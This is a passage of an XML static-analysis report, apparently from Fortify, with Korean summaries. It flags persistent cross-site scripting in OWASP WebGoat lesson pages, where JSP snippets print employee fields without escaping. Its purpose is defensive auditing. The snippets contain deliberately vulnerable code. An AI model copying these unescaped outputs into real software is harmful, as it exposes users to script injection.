                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8DF030071B6E61BAF4C73D82626A490F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FF09200C8CCB91F75E0BD6C6654B4479" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="87D26C0F40CF6F3A91A934E409F06406" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;textarea name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_NOTES%&gt;" cols="53" rows="2" wrap="off" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="064A21AF05AC8DF93BD24B58A68C1271" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7355D22A0F6710C350E51577BD25BC4B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="33A64AA2D0DB8AA4A7A6BB146D1BCFE2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D5F710FC5748255DD6501967C0B33E49" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0D6F3B91760DBB9BD0AB1656704259C0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 126 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4CB88043B56E93940EC93D06C8CC5446" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress2()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CD2B8F25D8B28D14EB2F6B1F419CE895" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CDCC2A00EE5EECF8A43076FCCFC320D6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B33C864CE65996482606F0B9AD36EBCA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 95 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>95</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7D61A2D3C1EBBCF8553534E3EDB7B587" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4593717DF79CF4E885F9ED2CC7000F26" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A35977F5CAB127346E5E3F610B22EBF0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 95 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>95</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="16E04BD8FE982E4BF1ECCEC657D3FE73" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7C8A3C49424F7F233221E8398A62F75C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="73FF93D094BF359E68DABAB328698EE8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 86 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>86</LineStart>
<Snippet>						&lt;!-- Encode data that might contain HTML content to protect against XSS --&gt;

						&lt;%=webSession.htmlEncode(employee.getPersonalDescription())%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="573EC966BC6BE1551565B7B3F7437731" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FC9190822D7FE6125AA0B25076383F17" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
